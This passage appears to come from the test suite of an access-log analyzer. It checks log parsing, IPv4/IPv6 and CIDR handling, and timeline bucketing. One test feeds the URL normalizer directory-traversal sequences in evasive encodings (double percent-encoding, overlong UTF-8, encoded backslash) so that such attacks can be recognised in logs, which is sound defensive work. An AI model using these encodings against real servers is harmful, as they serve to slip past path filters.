  assert.strictEqual(x.entries.length, 0, "the first proxy address must not be taken for a virtual host");
  assert.match(x.unparsed[0].reason, /virtual host/);
});

await test("verifier: RFC 3986 percent decoding and RFC 4291 address forms", () => {
  assert.strictEqual(normalizeForMatch("%2e%2e%2f"), "../");
  assert.strictEqual(normalizeForMatch("%252e%252e%252f"), "../", "double encoding");
  assert.strictEqual(normalizeForMatch("%c0%ae%c0%ae%c0%af"), "../", "overlong UTF-8");
  assert.strictEqual(normalizeForMatch("%2E%2E%5C"), "../", "backslash folded to slash");
  assert.strictEqual(normalizeForMatch("%zz%4"), "%zz%4", "malformed escapes left alone");
  // RFC 4291 section 2.2 examples.
  assert.strictEqual(parseIPv6("2001:DB8:0:0:8:800:200C:417A"), parseIPv6("2001:db8::8:800:200c:417a"));
  assert.strictEqual(parseIPv6("FF01::101"), (0xff01n << 112n) | 0x101n);
  assert.strictEqual(parseIPv6("::13.1.68.3"), (13n << 24n) | (1n << 16n) | (68n << 8n) | 3n);
  assert.strictEqual(parseIPv6("::FFFF:129.144.52.38"), (0xffffn << 32n) | (129n << 24n) | (144n << 16n) | (52n << 8n) | 38n);
  assert.strictEqual(parseIPv6("1:2:3:4:5:6:7:8:9"), null);
  assert.strictEqual(parseIPv6("1::2::3"), null);
  assert.strictEqual(parseIPv6("12345::"), null);
  assert.strictEqual(parseIPv4("192.168.010.1"), null, "leading zeros refused");
  const f = parseIpFilter("192.0.2.0/24");
  assert.ok(f.ok && f.value);
  if (f.ok && f.value) {
    assert.ok(f.value("::ffff:192.0.2.77"), "IPv4-mapped address matches the IPv4 block");
    assert.ok(!f.value("192.0.3.1"));
  }
  const g = parseIpFilter("2001:db8::/32");
  if (g.ok && g.value) {
    assert.ok(g.value("2001:0db8:ffff::1"));
    assert.ok(!g.value("2001:db9::1"));
  } else assert.fail("valid IPv6 CIDR refused");
});

await test("verifier: timeline bucket width for a one-hour span", () => {
  // 09:00 to 10:00 needs 61 one-minute bars, more than 60, so the next
  // step, five minutes, applies: 09:00, 09:05, ... 10:00 is 13 bars.
  const r = parseLog(
    [
      '192.0.2.1 - - [10/Oct/2000:09:00:00 +0000] "GET / HTTP/1.1" 200 1',
      '192.0.2.1 - - [10/Oct/2000:10:00:00 +0000] "GET / HTTP/1.1" 500 1',
    ].join("\n"),
  );
  const tl = buildTimeline(r.entries);
  assert.ok(tl);
  if (tl) {
    assert.strictEqual(tl.bucketMs, 5 * 60_000);
    assert.strictEqual(tl.buckets.length, 13);
    assert.strictEqual(tl.buckets[0].ok, 1);
    assert.strictEqual(tl.buckets[12].server, 1);
    assert.strictEqual(tl.peak, 1);
  }
  assert.strictEqual(buildTimeline([]), null);
});

console.log(`access-log-analyzer: ${passed} tests passed`);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
